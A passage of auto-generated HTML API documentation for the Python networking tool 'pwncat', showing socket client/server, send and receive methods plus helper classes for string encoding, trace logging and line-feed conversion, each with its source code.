<div class="desc"><p>Close the communication socket used for send and receive.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def close_conn_sock(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Close the communication socket used for send and receive.&#34;&#34;&#34;
    try:
        self.__close(&#34;conn&#34;, self.__conn)
    except AttributeError:
        # Socket does not exist (anymore)
        pass</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.gethostbyname"><code class="name flex">
<span>def <span class="ident">gethostbyname</span></span>(<span>self, host, port)</span>
</code></dt>
<dd>
<div class="desc"><p>Translate hostname into IP address.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>host</code></strong> :&ensp;<code>str</code></dt>
<dd>The hostname to resolvea.</dd>
<dt><strong><code>port</code></strong> :&ensp;<code>int</code></dt>
<dd>The port of the hostname to resolve.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>Numeric IP address.</dd>
</dl>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>socket.gaierror</code></dt>
<dd>If hostname cannot be resolved.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def gethostbyname(self, host, port):
    # type: (Optional[str], int) -&gt; str
    &#34;&#34;&#34;Translate hostname into IP address.

    Args:
        host (str): The hostname to resolvea.
        port (int): The port of the hostname to resolve.

    Returns:
        str: Numeric IP address.

    Raises:
        socket.gaierror: If hostname cannot be resolved.
    &#34;&#34;&#34;
    family = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET
    socktype = socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM
    proto = socket.SOL_UDP if self.__options.udp else socket.SOL_TCP
    flags = 0

    # Quickly do wildcards for listening addresses
    if host is None:
        if family == socket.AF_INET:
            self.__log.debug(&#34;Resolving hostname not required, using wildcard: 0.0.0.0&#34;)
            return &#34;0.0.0.0&#34;
        if family == socket.AF_INET6:
            self.__log.debug(&#34;Resolving hostname not required, using wildcard: ::&#34;)
            return &#34;::&#34;

    if self.__options.nodns:
        flags = socket.AI_NUMERICHOST
    try:
        self.__log.debug(&#34;Resolving hostname: %s&#34;, host)
        infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
        addr = str(infos[0][4][0])
    except (AttributeError, socket.gaierror) as error:
        self.__log.error(&#34;Resolve Error: %s&#34;, error)
        raise socket.gaierror(error)  # type: ignore
    self.__log.debug(&#34;Resolved hostname: %s&#34;, addr)
    return addr</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.re_accept_client"><code class="name flex">
<span>def <span class="ident">re_accept_client</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Re-accept new clients, if connection is somehow closed or accept did not work.</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bool</code></dt>
<dd>Returns <code>True</code> on success and <code>False</code> and error.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def re_accept_client(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;Re-accept new clients, if connection is somehow closed or accept did not work.

    Returns:
        bool: Returns `True` on success and `False` and error.
    &#34;&#34;&#34;
    # [1/3] Close conn socket
    self.close_conn_sock()

    # [2/3] Accept
    try:
        conn = self.__accept(self.__sock)
    except socket.error:
        return False
    self.__conn = conn
    # [3/3] Set current receive timeout for socket to make it non-blocking
    self.__settimeout(self.__conn)
    return True</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.receive"><code class="name flex">
<span>def <span class="ident">receive</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Receive and return data from the connected socket.</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>Returns received data from connected socket.</dd>
</dl>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>socket.timeout</code></dt>
<dd>Except here to do an action when the socket is not busy.</dd>
<dt><code>AttributeError</code></dt>
<dd>Except here when current instance has closed itself (Ctrl+c).</dd>
<dt><code>socket.error</code></dt>
<dd>Except here when unconnected or connection was forcibly closed.</dd>
<dt><code>EOFError</code></dt>
<dd>
<p>Except here when upstream has closed the connection.</p>
</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def receive(self):
    # type: () -&gt; str
    &#34;&#34;&#34;Receive and return data from the connected socket.

    Returns:
        str: Returns received data from connected socket.

    Raises:
        socket.timeout: Except here to do an action when the socket is not busy.
        AttributeError: Except here when current instance has closed itself (Ctrl+c).
        socket.error:   Except here when unconnected or connection was forcibly closed.
        EOFError:       Except here when upstream has closed the connection.
    &#34;&#34;&#34;
    try:
        # https://manpages.debian.org/buster/manpages-dev/recv.2.en.html
        (byte, addr) = self.__conn.recvfrom(self.__options.bufsize)

    # [1/5] Non-blocking socket if socket.settimeout() is set
    # NOTE: This is the place where we can do any checks in between reads as the
    # socket has been changed from blocking to time-out based.
    # NOTE: This is also the place, where we quit in case we want to.
    except socket.timeout as error:
        raise socket.timeout(error)  # type: ignore

    # [2/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)
    except AttributeError:
        msg = &#34;Connection was closed by self.&#34;
        self.__log.warning(msg)
        raise AttributeError(msg)

    # [3/5] Connection was forcibly closed
    # [Errno 107] Transport endpoint is not connected
    # [Errno 10054] An existing connection was forcibly closed by the remote host
    # [WinError 10054] An existing connection was forcibly closed by the remote host
    except (OSError, socket.error) as error:
        self.__log.warning(&#34;Connection error: %s&#34;, error)
        raise socket.error(error)

    # If we&#39;re receiving data from a UDP client
    # we can firstly/finally set its addr/port in order
    # to send data back to it (see send() function)
    if self.__options.udp:
        self.__remote_addr = addr[0]
        self.__remote_port = addr[1]
        self.__log.debug(&#34;Client connected: %s:%d&#34;, self.__remote_addr, self.__remote_port)

    # [4/5] Upstream (server or client) is gone.
    # In TCP, there is no such thing as an empty message, so zero means a peer disconnect.
    # In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.
    if not byte:
        msg = &#34;Upstream has closed the connection.&#34;
        self.__log.info(msg)
        raise EOFError(msg)

    # [5/5] We have data to process
    data = self.__enc.decode(byte)
    self.__log.debug(
        &#34;Received %d bytes from %s:%d&#34;, len(data), self.__remote_addr, self.__remote_port
    )
    self.__log.trace(&#34;Received: %s&#34;, repr(data))  # type: ignore
    return data</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.run_client"><code class="name flex">
<span>def <span class="ident">run_client</span></span>(<span>self, addr, port)</span>
</code></dt>
<dd>
<div class="desc"><p>Run and create a TCP or UDP client and connect to a remote peer.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>addr</code></strong> :&ensp;<code>str</code></dt>
<dd>Numeric IP address to connect to (ensure to resolve a hostname beforehand).</dd>
<dt><strong><code>port</code></strong> :&ensp;<code>int</code></dt>
<dd>Port of the server to connect to.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bool</code></dt>
<dd>Returns <code>True</code> on success and <code>False</code> on failure.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def run_client(self, addr, port):
    # type: (str, int) -&gt; bool
    &#34;&#34;&#34;Run and create a TCP or UDP client and connect to a remote peer.

    Args:
        addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
        port (int): Port of the server to connect to.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    &#34;&#34;&#34;
    # [1/4] Create socket
    try:
        conn = self.__create_socket()
    except socket.error:
        return False

    # [2/4] Store socket in instance
    self.__conn = conn

    # [3/4] Set current receive timeout for socket to make it non-blocking
    self.__settimeout(self.__conn)

    # [UDP 4/4]
    if self.__options.udp:
        # UDP does not have a &#34;connect&#34; feature as it is a stateless protocol.
        # So in order for the send() function to ne the remote address,
        # we must explicitly set it here.
        # (For TCP, this is done in __connect()
        self.__remote_addr = addr
        self.__remote_port = port
        self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
        return True

    # [TCP 4/4] connect
    try:
        self.__connect(self.__conn, addr, port)
    except socket.error:
        self.__close(&#34;conn&#34;, self.__conn)
        return False

    self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
    return True</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.run_server"><code class="name flex">
<span>def <span class="ident">run_server</span></span>(<span>self, addr, port)</span>
</code></dt>
<dd>
<div class="desc"><p>Run and create a TCP or UDP listening server and wait for a client to connect.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>addr</code></strong> :&ensp;<code>str</code></dt>
<dd>Numeric IP address to bind to (ensure to resolve a hostname beforehand).</dd>
<dt><strong><code>port</code></strong> :&ensp;<code>int</code></dt>
<dd>Port of the address to bind to.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bool</code></dt>
<dd>Returns <code>True</code> on success and <code>False</code> on failure.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def run_server(self, addr, port):
    # type: (str, int) -&gt; bool
    # TODO: Integrate: --rebind(-wait|-robin)
    &#34;&#34;&#34;Run and create a TCP or UDP listening server and wait for a client to connect.

    Args:
        addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
        port (int): Port of the address to bind to.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    &#34;&#34;&#34;
    # [1/4] Create socket
    try:
        sock = self.__create_socket()
    except socket.error:
        return False

    # [2/4] Bind socket
    if not self.__bind(sock, addr, port):
        self.__close(&#34;sock&#34;, sock)
        return False

    family = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET

    # [UDP 3/4] There is no listen or accept for UDP
    if self.__options.udp:
        self.__conn = sock
        self.__log.info(&#34;Listening on %s (family %d/UDP, port %d)&#34;, addr, family, port)

    # [TCP 3/4] Requires listen and accept
    else:
        # Listen
        if not self.__listen(sock):
            self.__close(&#34;sock&#34;, sock)
            return False
        self.__log.info(&#34;Listening on %s (family %d/TCP, port %d)&#34;, addr, family, port)
        self.__print_socket_opts(sock, &#34;bind-sock&#34;)
        # Accept
        try:
            conn = self.__accept(sock)
        except socket.error:
            self.__close(&#34;sock&#34;, sock)
            return False
        self.__sock = sock
        self.__conn = conn

    # [4/4] Set current receive timeout for socket to make it non-blocking
    self.__settimeout(self.__conn)
    self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
    return True</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.send"><code class="name flex">
<span>def <span class="ident">send</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Send data through a connected socket.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>data</code></strong> :&ensp;<code>str</code></dt>
<dd>The data to send.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>int</code></dt>
<dd>Returns total bytes sent.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def send(self, data):
    # type: (str) -&gt; int
    &#34;&#34;&#34;Send data through a connected socket.

    Args:
        data (str): The data to send.

    Returns:
        int: Returns total bytes sent.
    &#34;&#34;&#34;
    # In case of sending data back to an udp client we need to wait
    # until the client has first connected and told us its addr/port.
    if self.__options.udp:
        if self.__remote_addr is None or self.__remote_port is None:
            self.__log.warning(&#34;UDP client has not yet connected. Queueing message&#34;)
            while self.__remote_addr is None or self.__remote_port is None:
                # In case the user pressed Ctrl+c on the server while trying
                # to send data to the client, we need to quit here, otherwise
                # it blocks the shutdown routine.
                if self.__ssig.has_stop():
                    return 0
                time.sleep(0.1)  # Less wastefull than using &#39;pass&#39;
            # First time a UDP client connects to the server (display it on the server)
            self.__log.info(
                &#34;Client connected from %s:%d&#34;, self.__remote_addr, self.__remote_port
            )

    curr = 0  # bytes send during one loop iteration
    send = 0  # total bytes send
    size = len(data)  # bytes of data that needs to be send
    byte = self.__enc.encode(data)
    assert size == len(byte), &#34;Encoding messed up string length, might need to do len() after.&#34;

    # Loop until all bytes have been send
    while send &lt; size:
        try:
            self.__log.debug(
                &#34;Trying to send %d bytes to %s:%d&#34;,
                size - send,
                self.__remote_addr,
                self.__remote_port,
            )
            self.__log.trace(&#34;Trying to send: %s&#34;, repr(byte))  # type: ignore
            if self.__options.udp:
                curr = self.__conn.sendto(byte, (self.__remote_addr, self.__remote_port))
                send += curr
            else:
                curr = self.__conn.send(byte)
                send += curr
            if curr == 0:
                self.__log.error(&#34;No bytes send during loop round.&#34;)
                return 0
            # Remove &#39;curr&#39; many bytes from byte for the next round
            byte = byte[curr:]
            self.__log.debug(
                &#34;Sent %d bytes to %s:%d (%d bytes remaining)&#34;,
                curr,
                self.__remote_addr,
                self.__remote_port,
                size - send,
            )
        except (OSError, socket.error) as error:
            self.__log.error(&#34;Socket OS Error: %s&#34;, error)
            return send
    return send</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.StopSignal"><code class="flex name class">
<span>class <span class="ident">StopSignal</span></span>
</code></dt>
<dd>
<div class="desc"><p>Provide a simple boolean switch.</p>
<p>Create a StopSignal instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class StopSignal(object):
    &#34;&#34;&#34;Provide a simple boolean switch.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Create a StopSignal instance.&#34;&#34;&#34;
        self.__stop = False

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def has_stop(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Check if a stop signal has been raised.&#34;&#34;&#34;
        return self.__stop

    def raise_stop(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Raise a stop signal.&#34;&#34;&#34;
        self.__stop = True</code></pre>
</details>
<h3>Methods</h3>
<dl>
<dt id="pwncat.StopSignal.has_stop"><code class="name flex">
<span>def <span class="ident">has_stop</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Check if a stop signal has been raised.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def has_stop(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;Check if a stop signal has been raised.&#34;&#34;&#34;
    return self.__stop</code></pre>
</details>
</dd>
<dt id="pwncat.StopSignal.raise_stop"><code class="name flex">
<span>def <span class="ident">raise_stop</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Raise a stop signal.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def raise_stop(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Raise a stop signal.&#34;&#34;&#34;
    self.__stop = True</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.StringEncoder"><code class="flex name class">
<span>class <span class="ident">StringEncoder</span></span>
</code></dt>
<dd>
<div class="desc"><p>Takes care about Python 2/3 string encoding/decoding.</p>
<p>This allows to parse all string/byte values internally between all
classes or functions as strings to keep full Python 2/3 compat.</p>
<p>Create a StringEncoder instance which converts str/bytes according to Python version.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class StringEncoder(object):
    &#34;&#34;&#34;Takes care about Python 2/3 string encoding/decoding.

    This allows to parse all string/byte values internally between all
    classes or functions as strings to keep full Python 2/3 compat.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Create a StringEncoder instance which converts str/bytes according to Python version.&#34;&#34;&#34;
        self.__py3 = sys.version_info &gt;= (3, 0)  # type: bool

        # https://stackoverflow.com/questions/606191/27527728#27527728
        self.__codec = &#34;cp437&#34;
        self.__fallback = &#34;latin-1&#34;

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def encode(self, data):
        # type: (str) -&gt; bytes
        &#34;&#34;&#34;Convert string into a byte type for Python3.&#34;&#34;&#34;
        if self.__py3:
            try:
                return data.encode(self.__codec)
            except UnicodeEncodeError:
                # TODO: Add logging
                return data.encode(self.__fallback)
        return data  # type: ignore

    def decode(self, data):
        # type: (bytes) -&gt; str
        &#34;&#34;&#34;Convert bytes into a string type for Python3.&#34;&#34;&#34;
        if self.__py3:
            return data.decode(self.__codec)
        return data  # type: ignore

    def base64_encode(self, data):
        # type: (str) -&gt; str
        &#34;&#34;&#34;Convert string into a base64 encoded string.&#34;&#34;&#34;
        return self.decode(base64.b64encode(self.encode(data)))</code></pre>
</details>
<h3>Methods</h3>
<dl>
<dt id="pwncat.StringEncoder.base64_encode"><code class="name flex">
<span>def <span class="ident">base64_encode</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Convert string into a base64 encoded string.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def base64_encode(self, data):
    # type: (str) -&gt; str
    &#34;&#34;&#34;Convert string into a base64 encoded string.&#34;&#34;&#34;
    return self.decode(base64.b64encode(self.encode(data)))</code></pre>
</details>
</dd>
<dt id="pwncat.StringEncoder.decode"><code class="name flex">
<span>def <span class="ident">decode</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Convert bytes into a string type for Python3.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode(self, data):
    # type: (bytes) -&gt; str
    &#34;&#34;&#34;Convert bytes into a string type for Python3.&#34;&#34;&#34;
    if self.__py3:
        return data.decode(self.__codec)
    return data  # type: ignore</code></pre>
</details>
</dd>
<dt id="pwncat.StringEncoder.encode"><code class="name flex">
<span>def <span class="ident">encode</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Convert string into a byte type for Python3.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def encode(self, data):
    # type: (str) -&gt; bytes
    &#34;&#34;&#34;Convert string into a byte type for Python3.&#34;&#34;&#34;
    if self.__py3:
        try:
            return data.encode(self.__codec)
        except UnicodeEncodeError:
            # TODO: Add logging
            return data.encode(self.__fallback)
    return data  # type: ignore</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.TraceLogger"><code class="flex name class">
<span>class <span class="ident">TraceLogger</span></span>
<span>(</span><span>name, level=0)</span>
</code></dt>
<dd>
<div class="desc"><p>Extend Python's default logger class with TRACE level logging.</p>
<p>Instantiate TraceLogger class.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>name</code></strong> :&ensp;<code>str</code></dt>
<dd>Instance name.</dd>
<dt><strong><code>level</code></strong> :&ensp;<code>int</code></dt>
<dd>Current log level.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class TraceLogger(logging.getLoggerClass()):  # type: ignore
    &#34;&#34;&#34;Extend Python&#39;s default logger class with TRACE level logging.&#34;&#34;&#34;

    LEVEL_NUM = 9
    LEVEL_NAME = &#34;TRACE&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, name, level=logging.NOTSET):
        # type: (str, int) -&gt; None
        &#34;&#34;&#34;Instantiate TraceLogger class.

        Args:
            name (str):  Instance name.
            level (int): Current log level.
        &#34;&#34;&#34;
        super(TraceLogger, self).__init__(name, level)
        logging.addLevelName(self.LEVEL_NUM, self.LEVEL_NAME)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def trace(self, msg, *args, **kwargs):
        # type: (str, Any, Any) -&gt; None
        &#34;&#34;&#34;Set custom log level for TRACE.

        Args:
            msg (str): The log message.
            args (args): *args for trace level log function.
            kwargs (kwargs): kwargs for trace level log function.
        &#34;&#34;&#34;
        if self.isEnabledFor(self.LEVEL_NUM):
            # Yes, logger takes its &#39;*args&#39; as &#39;args&#39;.
            self._log(self.LEVEL_NUM, msg, args, **kwargs)</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li>logging.Logger</li>
<li>logging.Filterer</li>
</ul>
<h3>Class variables</h3>
<dl>
<dt id="pwncat.TraceLogger.LEVEL_NAME"><code class="name">var <span class="ident">LEVEL_NAME</span></code></dt>
<dd>
<div class="desc"></div>
</dd>
<dt id="pwncat.TraceLogger.LEVEL_NUM"><code class="name">var <span class="ident">LEVEL_NUM</span></code></dt>
<dd>
<div class="desc"></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="pwncat.TraceLogger.trace"><code class="name flex">
<span>def <span class="ident">trace</span></span>(<span>self, msg, *args, **kwargs)</span>
</code></dt>
<dd>
<div class="desc"><p>Set custom log level for TRACE.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>msg</code></strong> :&ensp;<code>str</code></dt>
<dd>The log message.</dd>
<dt><strong><code>args</code></strong> :&ensp;<code>args</code></dt>
<dd>*args for trace level log function.</dd>
<dt><strong><code>kwargs</code></strong> :&ensp;<code>kwargs</code></dt>
<dd>kwargs for trace level log function.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def trace(self, msg, *args, **kwargs):
    # type: (str, Any, Any) -&gt; None
    &#34;&#34;&#34;Set custom log level for TRACE.

    Args:
        msg (str): The log message.
        args (args): *args for trace level log function.
        kwargs (kwargs): kwargs for trace level log function.
    &#34;&#34;&#34;
    if self.isEnabledFor(self.LEVEL_NUM):
        # Yes, logger takes its &#39;*args&#39; as &#39;args&#39;.
        self._log(self.LEVEL_NUM, msg, args, **kwargs)</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.Transform"><code class="flex name class">
<span>class <span class="ident">Transform</span></span>
</code></dt>
<dd>
<div class="desc"><p>Abstract class to for pwncat I/O transformers.</p>
<p>This is a skeleton that defines how the transformer for pwncat should look like.</p>
<p>Set specific options for this transformer.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class Transform(ABC):  # type: ignore
    &#34;&#34;&#34;Abstract class to for pwncat I/O transformers.

    This is a skeleton that defines how the transformer for pwncat should look like.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def log(self):
        # type: () -&gt; logging.Logger
        &#34;&#34;&#34;`TraceLogger`: Logger instance.&#34;&#34;&#34;
        return self.__log

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    @abstractmethod
    def __init__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Set specific options for this transformer.&#34;&#34;&#34;
        super(Transform, self).__init__()
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    @abstractmethod
    def transform(self, data):
        # type: (str) -&gt; str
        &#34;&#34;&#34;Implement a transformer function which transforms a string..

        Returns:
            str: The transformed string.
        &#34;&#34;&#34;</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li>abc.ABC</li>
</ul>
<h3>Subclasses</h3>
<ul class="hlist">
<li><a title="pwncat.TransformLinefeed" href="#pwncat.TransformLinefeed">TransformLinefeed</a></li>
</ul>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.Transform.log"><code class="name">var <span class="ident">log</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.TraceLogger" href="#pwncat.TraceLogger">TraceLogger</a></code>: Logger instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def log(self):
    # type: () -&gt; logging.Logger
    &#34;&#34;&#34;`TraceLogger`: Logger instance.&#34;&#34;&#34;
    return self.__log</code></pre>
</details>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="pwncat.Transform.transform"><code class="name flex">
<span>def <span class="ident">transform</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Implement a transformer function which transforms a string..</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The transformed string.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@abstractmethod
def transform(self, data):
    # type: (str) -&gt; str
    &#34;&#34;&#34;Implement a transformer function which transforms a string..

    Returns:
        str: The transformed string.
    &#34;&#34;&#34;</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.TransformLinefeed"><code class="flex name class">
<span>class <span class="ident">TransformLinefeed</span></span>
<span>(</span><span>opts)</span>
</code></dt>
<dd>
<div class="desc"><p>Implement basic linefeed replacement.</p>
<p>Set specific options for this transformer.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>opts</code></strong> :&ensp;<code><a title="pwncat.DsTransformLinefeed" href="#pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code></dt>
<dd>Transformer options.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class TransformLinefeed(Transform):
    &#34;&#34;&#34;Implement basic linefeed replacement.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, opts):
        # type: (DsTransformLinefeed) -&gt; None
        &#34;&#34;&#34;Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        &#34;&#34;&#34;
        super(TransformLinefeed, self).__init__()
        self.__opts = opts

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def transform(self, data):
        # type: (str) -&gt; str
        &#34;&#34;&#34;Transform linefeeds to CRLF, LF or CR if requested.

        Returns:
            str: The string with altered linefeeds.
        &#34;&#34;&#34;
        # &#39;auto&#39; keep it as it is
        if self.__opts.crlf is None:
            return data

        # ? -&gt; No line feeds
        if self.__opts.crlf == &#34;no&#34;:
            if data.endswith(&#34;\r\n&#34;):
                self.log.debug(&#34;Removing CRLF&#34;)
                return data[:-2]
            if data.endswith(&#34;\n&#34;):
                self.log.debug(&#34;Removing LF&#34;)
                return data[:-1]
            if data.endswith(&#34;\r&#34;):
                self.log.debug(&#34;Removing CR&#34;)
                return data[:-1]
        # ? -&gt; CRLF
        if self.__opts.crlf == &#34;crlf&#34; and not data.endswith(&#34;\r\n&#34;):
            if data.endswith(&#34;\n&#34;):
                self.log.debug(&#34;Replacing LF with CRLF&#34;)
                return data[:-1] + &#34;\r\n&#34;
            if data.endswith(&#34;\r&#34;):
                self.log.debug(&#34;Replacing CR with CRLF&#34;)
                return data[:-1] + &#34;\r\n&#34;
        # ? -&gt; LF
        if self.__opts.crlf == &#34;lf&#34;:
            if data.endswith(&#34;\r\n&#34;):
                self.log.debug(&#34;Replacing CRLF with LF&#34;)
                return data[:-2] + &#34;\n&#34;
            if data.endswith(&#34;\r&#34;):
                self.log.debug(&#34;Replacing CR with LF&#34;)
                return data[:-1] + &#34;\n&#34;
        # ? -&gt; CR
        if self.__opts.crlf == &#34;cr&#34;:
            if data.endswith(&#34;\r\n&#34;):
                self.log.debug(&#34;Replacing CRLF with CR&#34;)
                return data[:-2] + &#34;\r&#34;
            if data.endswith(&#34;\n&#34;):
                self.log.debug(&#34;Replacing LF with CR&#34;)
                return data[:-1] + &#34;\r&#34;

        # Otherwise just return it as it is
        return data</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="pwncat.Transform" href="#pwncat.Transform">Transform</a></li>
<li>abc.ABC</li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="pwncat.TransformLinefeed.transform"><code class="name flex">
<span>def <span class="ident">transform</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Transform linefeeds to CRLF, LF or CR if requested.</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The string with altered linefeeds.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def transform(self, data):
    # type: (str) -&gt; str
    &#34;&#34;&#34;Transform linefeeds to CRLF, LF or CR if requested.

    Returns:
        str: The string with altered linefeeds.
    &#34;&#34;&#34;
    # &#39;auto&#39; keep it as it is
    if self.__opts.crlf is None:
        return data

    # ? -&gt; No line feeds
    if self.__opts.crlf == &#34;no&#34;:
        if data.endswith(&#34;\r\n&#34;):
            self.log.debug(&#34;Removing CRLF&#34;)
            return data[:-2]
        if data.endswith(&#34;\n&#34;):
            self.log.debug(&#34;Removing LF&#34;)
            return data[:-1]
        if data.endswith(&#34;\r&#34;):
            self.log.debug(&#34;Removing CR&#34;)
            return data[:-1]
    # ? -&gt; CRLF
    if self.__opts.crlf == &#34;crlf&#34; and not data.endswith(&#34;\r\n&#34;):
        if data.endswith(&#34;\n&#34;):
            self.log.debug(&#34;Replacing LF with CRLF&#34;)
            return data[:-1] + &#34;\r\n&#34;
        if data.endswith(&#34;\r&#34;):
            self.log.debug(&#34;Replacing CR with CRLF&#34;)
            return data[:-1] + &#34;\r\n&#34;
    # ? -&gt; LF
    if self.__opts.crlf == &#34;lf&#34;:
        if data.endswith(&#34;\r\n&#34;):
            self.log.debug(&#34;Replacing CRLF with LF&#34;)
            return data[:-2] + &#34;\n&#34;
        if data.endswith(&#34;\r&#34;):
            self.log.debug(&#34;Replacing CR with LF&#34;)
            return data[:-1] + &#34;\n&#34;
    # ? -&gt; CR
    if self.__opts.crlf == &#34;cr&#34;:
        if data.endswith(&#34;\r\n&#34;):
            self.log.debug(&#34;Replacing CRLF with CR&#34;)
            return data[:-2] + &#34;\r&#34;
        if data.endswith(&#34;\n&#34;):
            self.log.debug(&#34;Replacing LF with CR&#34;)
            return data[:-1] + &#34;\r&#34;

    # Otherwise just return it as it is
    return data</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
